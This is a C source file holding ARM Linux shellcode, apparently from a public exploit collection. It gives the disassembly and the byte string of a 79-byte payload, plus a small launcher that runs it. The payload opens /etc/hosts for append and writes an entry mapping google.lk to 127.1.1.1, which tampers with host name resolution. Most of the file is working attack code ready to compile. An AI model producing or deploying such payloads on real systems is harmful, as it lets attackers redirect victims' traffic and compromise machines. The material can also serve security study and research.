/*
# Title: Add map in /etc/hosts file - 79 bytes
# Date: 2015-03-02
# Architecture: armv6l GNU/Linux
# Website: http://osandamalith.wordpress.com
# E-Mail: osanda[cat]unseen.is
# Author: Osanda Malith Jayathissa (@OsandaMalith)

hosts:     file format elf32-littlearm


Disassembly of section .text:

00008054 <_start>:
    8054:       e28f6001        add     r6, pc, #1
    8058:       e12fff16        bx      r6
    805c:       1b24            subs    r4, r4, r4
    805e:       1c22            adds    r2, r4, #0
    8060:       21ff            movs    r1, #255        ; 0xff
    8062:       31ff            adds    r1, #255        ; 0xff
    8064:       31ff            adds    r1, #255        ; 0xff
    8066:       31ff            adds    r1, #255        ; 0xff
    8068:       3105            adds    r1, #5
    806a:       4678            mov     r0, pc
    806c:       302a            adds    r0, #42 ; 0x2a
    806e:       2705            movs    r7, #5
    8070:       df01            svc     1
    8072:       2214            movs    r2, #20
    8074:       4679            mov     r1, pc
    8076:       310c            adds    r1, #12
    8078:       2704            movs    r7, #4
    807a:       df01            svc     1
    807c:       1b24            subs    r4, r4, r4
    807e:       1c20            adds    r0, r4, #0
    8080:       2701            movs    r7, #1
    8082:       df01            svc     1
    8084:       2e373231        mrccs   2, 1, r3, cr7, cr1, {1}
    8088:       2e312e31        mrccs   14, 1, r2, cr1, cr1, {1}
    808c:       6f672031        svcvs   0x00672031
    8090:       656c676f        strbvs  r6, [ip, #-1903]!       ; 0x76f
    8094:       0a6b6c2e        beq     1ae3154 <__bss_end__+0x1ad30b0>
    8098:       6374652f        cmnvs   r4, #197132288  ; 0xbc00000
    809c:       6f682f2f        svcvs   0x00682f2f
    80a0:       00737473        rsbseq  r7, r3, r3, ror r4

*/

#include <stdio.h>
#include <string.h>

char *shellcode =   "\x01\x60\x8f\xe2"
                    "\x16\xff\x2f\xe1"
                    "\x24\x1b"
                    "\x22\x1c"
                    "\xff\x21"
                    "\xff\x31"
                    "\xff\x31"
                    "\xff\x31"
                    "\x05\x31"
                    "\x78\x46"
                    "\x2a\x30"
                    "\x05\x27"
                    "\x01\xdf"
                    "\x14\x22" // movs    r2, $0x14 ; length
                    "\x79\x46"
                    "\x0c\x31"
                    "\x04\x27"
                    "\x01\xdf"
                    "\x24\x1b"
                    "\x20\x1c"
                    "\x01\x27"
                    "\x01\xdf"
                    "\x31\x32\x37\x2e" // 127.
                    "\x31\x2e\x31\x2e" // 1.1.
                    "\x31\x20\x67\x6f" // 1 go
                    "\x6f\x67\x6c\x65" // ogle
                    "\x2e\x6c\x6b\x0a" // .lk
                    "\x2f\x65\x74\x63"
                    "\x2f\x2f\x68\x6f"
                    "\x73\x74\x73";

int main(void) {
        fprintf(stdout,"Length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();
return 0;
}